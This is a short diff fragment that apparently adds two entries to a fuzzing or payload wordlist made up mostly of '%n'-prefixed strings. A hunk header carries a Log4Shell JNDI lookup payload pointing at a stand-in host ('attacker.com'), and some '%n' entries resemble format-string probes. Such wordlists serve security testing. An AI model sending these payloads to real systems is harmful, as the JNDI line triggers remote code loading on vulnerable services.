@@ -29,6 +29,7 @@ ${jndi:rmi://attacker.com/a}
 %n25d33x6&7h2p$sxu&m
 %n4cw
 %n4v4rr0$
+%n57jk01
 %n6
 %n9q+^u='4.al-:
 %n]%>
@@ -41,6 +42,7 @@ ${jndi:rmi://attacker.com/a}
 %nb6#h!x
 %nesreen
 %nethood%/
+%newswatcher7
 %ng1&3uc
 %ngglass%
 %nh99tw1
